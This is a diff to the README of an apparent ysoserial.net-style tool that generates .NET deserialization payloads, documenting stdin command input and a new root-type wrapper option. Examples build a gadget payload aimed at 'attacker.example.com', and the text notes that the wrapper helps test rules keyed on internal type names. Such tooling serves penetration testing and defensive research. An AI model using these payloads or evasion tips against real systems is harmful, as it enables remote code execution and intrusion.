@@ -24,7 +24,8 @@ Options:
                                being appended (anything after first space is an
                                argument).
   -s, --stdin                The command to be executed will be read from
-                               standard input.
+                               standard input (the first line, up to 2,050
+                               bytes). A non-empty -c wins.
       --bgc, --bridgedgadgetchains=VALUE
                              Chain of bridged gadgets separated by comma (,).
                                Each gadget will be used to complete the next
@@ -326,6 +327,12 @@ When specifying complex commands, it can be tedious to escape some special chara
 ```bash
 cat my_long_cmd.txt | ysonet.exe -o raw -g WindowsIdentity -f Json.Net -s
 ```
+
+`-s` reads the FIRST LINE of standard input, up to 2,050 bytes, as ASCII. A leading UTF-8
+byte-order mark is ignored, so a caller that adds one (many do, without meaning to) still
+sends the command it typed. An input that carries no command is reported as
+`Standard input did not contain a command.` and nothing is generated. A non-empty `-c`
+always wins over `-s`.
 
 XmlSerializer and DataContractSerializer formatters generate a wrapper XML format including the expected type in the `type` attribute of the root node, as used, for example, in DotNetNuke. You may need to modify the generated XML based on how XmlSerializer gets the expected type in your case.
 
@@ -889,6 +896,9 @@ connect to it before it can fail.
 
 # ship a blob you built yourself, byte for byte
 ./ysonet.exe -g WbemClassObjectUnmarshal -f SoapFormatter --variant 2 -c "C:\work\objref.bin"
+
+# put a PUBLIC type at the root instead of the internal one, same payload underneath
+./ysonet.exe -g WbemClassObjectUnmarshal -f BinaryFormatter -c "attacker.example.com" --rootcarrier 2
 ```
 
 Four things to know:
@@ -927,6 +937,19 @@ express, such as an `OBJREF_CUSTOM`.
 Note also that capturing a real marshalled `IWbemClassObject` does NOT give you
 variant 1's behaviour: WMI marshals such an object by value as an
 `OBJREF_CUSTOM`, which names no host at all.
+
+`--rootcarrier` is a separate question from `--variant`, and it only changes the
+TYPE NAME at the root of the payload. Carrier 1 (the default) is the bare
+`IWbemClassObjectFreeThreaded`, which is internal to `System.Management`. Carrier 2
+wraps it in the public `System.Management.ManagementBaseObject`, which passes it to
+exactly the same constructor, so the blob, the input and the effect are identical.
+Reach for it in two cases: when the target names its own root type, because a plain
+`DataContractSerializer` consumer can only ever name a public one; and when you are
+testing a rule that keys on the internal name. It is NOT a `SerializationBinder`
+bypass - a binder sees every type in the stream, the nested one included - and it
+costs two formatters: `DataContractSerializer` has nowhere to name the internal
+inner type, and FsPickler refuses `ManagementBaseObject` outright because it derives
+from `MarshalByRefObject`. Both cells are refused with a message that says so.
 
 ### Make the target fetch an external DTD (legacy XXE)
 
